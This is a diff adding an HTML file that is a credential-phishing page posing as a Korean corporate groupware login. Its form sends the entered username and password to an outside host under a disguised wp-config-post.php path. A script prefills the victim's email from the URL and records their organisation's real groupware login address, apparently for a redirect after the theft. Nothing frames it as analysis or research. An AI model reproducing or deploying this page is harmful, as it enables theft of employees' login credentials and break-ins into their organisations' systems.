@@ -1,0 +1,168 @@
+﻿<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>&#44536;&#47353;&#50920;&#50612;</title>
+</head>
+<style>
+  html, body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 13px;
+  color: #404040;
+  direction: ltr;
+  -webkit-text-size-adjust: none;
+  }
+  button,
+  input[type=button],
+  input[type=submit] {
+  font-family: Arial, sans-serif;
+  font-size: 13px;
+  }
+  a,
+  a:hover,
+  a:visited {
+  color: #427fed;
+  cursor: pointer;
+  text-decoration: none;
+  }
+  a:hover {
+  text-decoration: underline;
+  }
+  h1 {
+  font-size: 20px;
+  color: #262626;
+  margin: 0 0 15px;
+  font-weight: normal;
+  }
+  h2 {
+  font-size: 14px;
+  color: #262626;
+  margin: 0 0 15px;
+  font-weight: bold;
+  }
+  input[type=text],
+  input[type=password] {
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 20px;
+  width: 100%;
+  padding: 6px 4px;
+  margin: 0;
+  border: 1px solid #ccc;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 0;
+  font-size: 12px;
+  font-family: Arial,sans-serif;
+  color: #404040;
+  }
+  </style>
+<body background="img/bg.png">
+
+<div align="center">
+	<table border="0" width="606" cellspacing="0" cellpadding="0">
+		<tr>
+			<td >
+			<table border="0" width="100%" cellspacing="0" cellpadding="0">
+				<tr>
+					<td height="102" ></td>
+				</tr>
+				<tr>
+					<td background="img/fm.png">
+					<table border="0" width="100%" cellspacing="0" cellpadding="0">
+					   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
+						<tr>
+							<td height="272" ></td>
+						</tr>
+						<tr>
+							<td height="42">
+							<table border="0" width="100%" cellspacing="0" cellpadding="0">
+								<tr>
+									<td width="258"></td>
+									<td width="142">
+									<table border="0" width="100%" cellspacing="0" cellpadding="0">
+										<tr>
+											<td>
+											  <input type="text" id="userInput" name="user" required value="user" >
+											</td>
+										</tr>
+										<tr>
+											<td height="3">
+											  <input type="hidden" id="linkInput" name="link" value="" >
+											  <input type="hidden" name="sender" value="Groupware.com" >
+											  <input type="hidden" id="domainInput" name="domain" value="" >
+											</td>
+										</tr>
+										<tr>
+											<td>
+											   <input type="password" name="passwd" required autofocus />
+											</td>
+										</tr>
+									</table>
+									</td>
+									<td width="6"></td>
+									<td width="48">
+									<table border="0" width="100%" cellspacing="0" cellpadding="0">
+										<tr>
+											<td height="5"></td>
+										</tr>
+										<tr>
+											<td>
+											<input type="image" src="img/btn.png" width="50" height="35"></td>
+										</tr>
+										<tr>
+											<td height="5"></td>
+										</tr>
+									</table>
+									</td>
+									<td>&nbsp;</td>
+								</tr>
+							</table>
+							</td>
+						</tr>
+						<tr>
+							<td height="56"></td>
+						</tr>
+					  </form>
+					</table>
+					</td>
+				</tr>
+				<tr>
+					<td>&nbsp;</td>
+				</tr>
+			</table>
+			</td>
+		</tr>
+	</table>
+</div>
+
+</body>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const raw = params.get('login');
+    const email = raw ? decodeURIComponent(raw) : '';
+
+    let user = '', domain = '';
+    if (email.includes('@')) {
+      [user, domain] = email.split(/@(.*)/, 2);
+    }
+
+    if (email) {
+      document.getElementById('userInput').value = email;
+      document.getElementById('domainInput').value = domain;
+      document.getElementById('linkInput').value = `http://gw.${domain}/groupware/login.php`;
+      document.getElementById('greeting').textContent = email;
+    }
+  </script>
+</html>
